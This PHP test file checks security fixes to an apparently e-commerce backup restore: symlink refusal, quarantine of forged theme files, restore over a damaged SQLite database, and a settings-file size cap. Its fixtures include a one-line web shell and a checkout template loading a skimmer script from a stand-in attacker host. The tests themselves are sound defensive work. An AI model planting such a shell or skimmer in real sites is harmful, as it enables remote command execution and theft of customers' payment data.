<?php

// Review round 54 (kolo 19), backups:
//  medium 1: only backup_recovery_dir was checked, not its from-backup directory: replaced by a symlink to the application
//            root, restore --files-only --yes wrote the backup's config.php over the live one and shell.php into the web
//            root while reporting them set aside in the private directory;
//  low: a forged backup added a child theme template (checkout.html with its own script) that the restore wrote in place;
//  low: a SQLite restore over a partially damaged live database stopped reading the live number series (R50);
//  low: stores.json had no size limit (3 GB held root's update check for a minute).
echo "\n--- Audit round 54: per-restore aside directory, theme files set aside, damaged live DB, stores.json size ---\n";
$r54rRoot = sys_get_temp_dir() . '/bbe-r54r-' . getmypid() . '-' . bin2hex(random_bytes(4));
mkdir($r54rRoot, 0700, true);
$r54rRm = static function (string $path) use (&$r54rRm): void {
    if (is_link($path) || is_file($path)) { @unlink($path); return; }
    if (!is_dir($path)) return;
    foreach (scandir($path) ?: [] as $entry) {
        if ($entry !== '.' && $entry !== '..') $r54rRm($path . '/' . $entry);
    }
    @rmdir($path);
};
$r54rFail = static function (string $what, Throwable $e): void {
    assert_true(false, "R54 {$what} (" . get_class($e) . ': ' . $e->getMessage() . ' @ ' . basename($e->getFile()) . ':' . $e->getLine() . ')');
};
$r54rCfg = static fn(string $root, array $files = []): array => ['enabled' => true, 'storage' => 'local', 'compression' => false,
    'auto_gc_on_backup' => false, 'retention' => ['daily' => 0, 'weekly' => 0, 'monthly' => 0, 'minimum_kept' => 5],
    'storage_dir' => $root . '/backups', 'files' => $files];

// 1. from-backup as a symlink to the shop: the restore refuses and writes nothing; a real one gets a 0700 directory per restore.
$r54rShop = $r54rRoot . '/shop';
$r54rData = $r54rRoot . '/data';
foreach (['/themes/default/assets', '/uploads'] as $r54rSub) @mkdir($r54rShop . $r54rSub, 0755, true);
@mkdir($r54rData, 0700, true);
file_put_contents($r54rShop . '/config.php', "<?php return ['db_name' => 'r54-backup'];");
file_put_contents($r54rShop . '/themes/default/home.html', '<h1>shop</h1>');
file_put_contents($r54rShop . '/themes/default/assets/shell.php', '<?php system($_GET["c"]);');
@mkdir($r54rShop . '/themes/child', 0755, true);
file_put_contents($r54rShop . '/themes/child/checkout.html', '<script src="https://evil.example/skim.js"></script>');
$r54rSources = BackupService::defaultFileSources(['private_runtime_dir' => $r54rData, 'jobs_dir' => $r54rData . '/jobs',
    'invoice_storage_dir' => $r54rData . '/invoices', 'uploads_dir' => $r54rShop . '/uploads', 'gdpr_salt_file' => $r54rData . '/gdpr_salt',
    'digital_assets_base_dir' => $r54rData . '/downloads'], $r54rShop);
$r54rPdo = new PDO('sqlite:' . $r54rRoot . '/files.db', null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$r54rPdo->exec('CREATE TABLE x (id INTEGER PRIMARY KEY)');
$r54rRecovery = $r54rRoot . '/restore-recovery';
try {
    BackupService::init($r54rPdo, $r54rCfg($r54rRoot, $r54rSources), $r54rShop);
    // The archive holds what whoever can write the backup storage puts in.
    $r54rPath = (string)BackupService::create(['label' => 'manual'])['remote_path'];
    file_put_contents($r54rShop . '/config.php', "<?php return ['db_name' => 'r54-live'];");
    unlink($r54rShop . '/themes/default/assets/shell.php');
    $r54rRm($r54rShop . '/themes/child');

    if (PHP_OS_FAMILY !== 'Windows') {
        mkdir($r54rRecovery, 0770);
        symlink($r54rShop, $r54rRecovery . '/from-backup');
        $r54rError = '';
        try {
            BackupService::restoreFiles($r54rPath);
        } catch (Throwable $e) {
            $r54rError = $e->getMessage();
        }
        clearstatcache();
        assert_equals("<?php return ['db_name' => 'r54-live'];", (string)file_get_contents($r54rShop . '/config.php'),
            'R54 restore: a symlinked from-backup does not let the restore write config.php over the live one');
        $r54rLeaked = array_values(array_filter([...(glob($r54rShop . '/*/config.php') ?: []), $r54rShop . '/themes/default/assets/shell.php',
            $r54rShop . '/themes/child/checkout.html'], 'file_exists'));
        assert_equals([], $r54rLeaked, 'R54 restore: nothing is written into the shop through the symlinked from-backup');
        assert_true(str_contains($r54rError, 'symlink'), "R54 restore: the restore refuses and says why ({$r54rError})");
        unlink($r54rRecovery . '/from-backup');
    }

    $r54rFiles = BackupService::restoreFiles($r54rPath);
    $r54rAside = (string)($r54rFiles['aside_dir'] ?? '');
    clearstatcache();
    assert_true(dirname($r54rAside) === $r54rRecovery . '/from-backup' && preg_match('/^\d{8}-\d{6}-[0-9a-f]{12}$/', basename($r54rAside)) === 1,
        "R54 restore: each restore sets its copies aside in from-backup/<time>-<random> ({$r54rAside})");
    if (PHP_OS_FAMILY !== 'Windows') {
        assert_equals(['700', '700'], [sprintf('%o', fileperms($r54rRecovery . '/from-backup') & 0777), sprintf('%o', fileperms($r54rAside) & 0777)],
            'R54 restore: from-backup and the directory of the restore are 0700');
    }
    assert_equals(["<?php return ['db_name' => 'r54-live'];", "<?php return ['db_name' => 'r54-backup'];"],
        [file_get_contents($r54rShop . '/config.php'), @file_get_contents($r54rAside . '/config.php')],
        'R54 restore: the differing config.php is set aside in that directory');
    assert_true(!file_exists($r54rShop . '/themes/child/checkout.html') && is_file($r54rAside . '/themes/child/checkout.html'),
        'R54 restore: a child theme template the live themes lack is set aside, not installed (forged checkout.html with its own script)');
    assert_true(in_array('themes/child/checkout.html', (array)($r54rFiles['set_aside'] ?? []), true) && in_array('themes/default/assets/shell.php', (array)($r54rFiles['quarantined'] ?? []), true),
        'R54 restore: the set-aside template and the quarantined script are reported');
    assert_true(is_file($r54rShop . '/themes/default/home.html') && !file_exists($r54rAside . '/themes/default/home.html'),
        'R54 restore: an identical theme file is just unchanged');
    $r54rSecond = BackupService::restoreFiles($r54rPath);
    assert_true(($r54rSecond['aside_dir'] ?? '') !== $r54rAside && is_file((string)($r54rSecond['aside_dir'] ?? '') . '/config.php') && is_file($r54rAside . '/config.php'),
        'R54 restore: a second restore gets a directory of its own and leaves the first one as it was');
    $r54rCli = (string)file_get_contents(TEST_CLI_DIR . '/restore.php');
    assert_true(str_contains($r54rCli, "\$files['aside_dir']") && !str_contains($r54rCli, 'BackupService::asideDirectory()'),
        'R54 restore: cli/restore.php prints the directory this restore wrote to');
} catch (Throwable $e) {
    $r54rFail('aside directory', $e);
} finally {
    BackupService::reset();
    $r54rPdo = null;
    gc_collect_cycles();
}

// 2. A SQLite restore over a live database whose counter table is damaged completes, with a warning.
$r54rLivePath = $r54rRoot . '/live.db';
$r54rLive = new PDO('sqlite:' . $r54rLivePath, null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$r54rLive->exec('CREATE TABLE schema_migrations (name TEXT PRIMARY KEY)');
$r54rLive->exec("CREATE TABLE invoice_number_counters (store_id TEXT NOT NULL, type TEXT NOT NULL DEFAULT 'invoice', year INTEGER NOT NULL,
    prefix TEXT NOT NULL DEFAULT '', last_number INTEGER NOT NULL DEFAULT 0, PRIMARY KEY (store_id, type, year, prefix))");
$r54rLive->exec("INSERT INTO invoice_number_counters VALUES ('default', 'invoice', 2026, 'FA', 3)");
try {
    BackupService::init($r54rLive, $r54rCfg($r54rRoot . '/db'), $r54rRoot);
    $r54rOld = (string)BackupService::create(['label' => 'scheduled'])['remote_path'];
    $r54rPage = (int)$r54rLive->query('PRAGMA page_size')->fetchColumn();
    $r54rRootPage = (int)$r54rLive->query("SELECT rootpage FROM sqlite_master WHERE name = 'invoice_number_counters'")->fetchColumn();
    BackupService::reset();
    $r54rLive = null;
    gc_collect_cycles();
    $r54rHandle = fopen($r54rLivePath, 'r+b');
    fseek($r54rHandle, ($r54rRootPage - 1) * $r54rPage);
    fwrite($r54rHandle, str_repeat("\xA5", $r54rPage));
    fclose($r54rHandle);
    $r54rLive = new PDO('sqlite:' . $r54rLivePath, null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    $r54rBroken = '';
    try { $r54rLive->query('SELECT last_number FROM invoice_number_counters')->fetchAll(); } catch (Throwable $e) { $r54rBroken = $e->getMessage(); }
    assert_true($r54rBroken !== '', 'R54 damaged live: the live counter table cannot be read (precondition)');
    BackupService::init($r54rLive, $r54rCfg($r54rRoot . '/db'), $r54rRoot);
    $r54rLive = null;
    $r54rRestored = null;
    // A damaged database cannot be snapshotted (VACUUM INTO): restoring it is what --skip-snapshot is for.
    try { $r54rRestored = BackupService::restore($r54rOld, ['skip_snapshot' => true]); } catch (Throwable $e) { $r54rRestored = $e->getMessage(); }
    assert_true(is_array($r54rRestored), 'R54 damaged live: the restore completes (was: stopped reading the live number series; '
        . (is_string($r54rRestored) ? $r54rRestored : 'ok') . ')');
    $r54rWarnings = implode(' | ', is_array($r54rRestored) ? (array)($r54rRestored['numbering_warnings'] ?? []) : []);
    assert_true(str_contains($r54rWarnings, 'could not be read'), "R54 damaged live: the operator is warned the numbers were not carried over ({$r54rWarnings})");
    $r54rAfter = new PDO('sqlite:' . $r54rLivePath, null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    assert_equals(3, (int)$r54rAfter->query("SELECT last_number FROM invoice_number_counters")->fetchColumn(), 'R54 damaged live: the restored database is readable');
    $r54rAfter = null;
} catch (Throwable $e) {
    $r54rFail('damaged live database', $e);
} finally {
    BackupService::reset();
    $r54rLive = null;
    gc_collect_cycles();
}

// 3. readRegularFile() (stores.json, mail settings under root) refuses a file larger than any real settings file.
$r54rBig = $r54rRoot . '/stores-big.json';
$r54rHandle = fopen($r54rBig, 'wb');
ftruncate($r54rHandle, DataOverrides::MAX_SETTINGS_BYTES + 1);
fclose($r54rHandle);
file_put_contents($r54rRoot . '/stores-small.json', '{"stores":{}}');
$r54rStart = microtime(true);
assert_equals([null, '{"stores":{}}'], [DataOverrides::readRegularFile($r54rBig), DataOverrides::readRegularFile($r54rRoot . '/stores-small.json')],
    'R54 stores.json: a settings file over ' . DataOverrides::MAX_SETTINGS_BYTES . ' bytes is not read, a normal one is');
assert_true(microtime(true) - $r54rStart < 1.0, 'R54 stores.json: refusing the large file does not read it');

$r54rRm($r54rRoot);
